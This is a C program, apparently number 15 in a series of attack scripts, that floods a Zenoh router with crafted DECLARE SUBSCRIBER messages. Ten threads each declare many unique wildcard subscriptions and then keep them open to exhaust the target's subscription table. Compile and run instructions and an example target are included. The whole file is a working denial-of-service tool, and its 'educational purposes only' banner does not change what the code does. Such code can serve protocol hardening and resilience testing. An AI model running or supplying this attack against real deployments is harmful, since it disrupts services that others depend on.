/*
 * Attack 15: Subscription Table Exhaustion
 * Creates massive number of unique subscriptions to exhaust resources
 * 
 * Compile: gcc -o attack15_subexhaust attack_15_subscription_exhaustion.c -pthread
 * Run: ./attack15_subexhaust <target_ip> <target_port> <count>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_N_DECLARE 0x0B
#define Z_DECL_SUBSCRIBER 0x03

static volatile int g_running = 1;
static atomic_ullong g_subscriptions_created = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
    int target_count;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping subscription exhaustion...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

size_t craft_declare_subscriber(unsigned char *buffer, unsigned int sub_id, 
                                const char *key_expr) {
    size_t offset = 0;
    
    // Network message: DECLARE
    buffer[offset++] = Z_N_DECLARE;
    
    // Declaration: SUBSCRIBER
    buffer[offset++] = Z_DECL_SUBSCRIBER;
    
    // Subscriber ID
    offset += encode_zint(buffer + offset, sub_id);
    
    // Key expression length
    size_t key_len = strlen(key_expr);
    offset += encode_zint(buffer + offset, key_len);
    
    // Key expression
    memcpy(buffer + offset, key_expr, key_len);
    offset += key_len;
    
    return offset;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[1024];
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
        fprintf(stderr, "[-] Thread %d: Connect failed\n", args->thread_id);
        close(sock);
        free(args);
        return NULL;
    }
    
    printf("[+] Thread %d connected, creating subscriptions\n", args->thread_id);
    
    unsigned int sub_id = args->thread_id * 100000;
    unsigned long local_count = 0;
    
    while (g_running && local_count < args->target_count) {
        // Generate unique key expression
        char key_expr[256];
        snprintf(key_expr, sizeof(key_expr), 
                "attack/sub/exhaust/%d/%d/%lu/**",
                args->thread_id, rand(), local_count);
        
        size_t msg_len = craft_declare_subscriber(buffer, sub_id++, key_expr);
        
        ssize_t sent = send(sock, buffer, msg_len, 0);
        if (sent < 0) {
            fprintf(stderr, "[-] Thread %d: Send failed\n", args->thread_id);
            break;
        }
        
        atomic_fetch_add(&g_subscriptions_created, 1);
        local_count++;
        
        if (local_count % 100 == 0) {
            printf("[Thread %d] Created %lu subscriptions\n",
                   args->thread_id, local_count);
        }
        
        usleep(100); // Small delay to avoid overwhelming
    }
    
    // Keep connection alive
    printf("[Thread %d] Keeping %lu subscriptions alive...\n", 
           args->thread_id, local_count);
    
    while (g_running) {
        sleep(10);
    }
    
    close(sock);
    printf("[*] Thread %d stopped\n", args->thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <subscriptions_per_thread>\n", argv[0]);
        fprintf(stderr, "Example: %s 127.0.0.1 7447 1000\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int subs_per_thread = atoi(argv[3]);
    int num_threads = 10;
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Subscription Table Exhaustion      ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Subscriptions per thread: %d\n", subs_per_thread);
    printf("[*] Total target: %d subscriptions\n\n", num_threads * subs_per_thread);
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        args->target_count = subs_per_thread;
        pthread_create(&threads[i], NULL, attack_thread, args);
        usleep(100000); // 100ms between thread starts
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long total = atomic_load(&g_subscriptions_created);
        printf("[*] Total subscriptions created: %llu\n", total);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Subscriptions: %-21llu ║\n", 
           (unsigned long long)atomic_load(&g_subscriptions_created));
    printf("║ Duration:            %-21ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}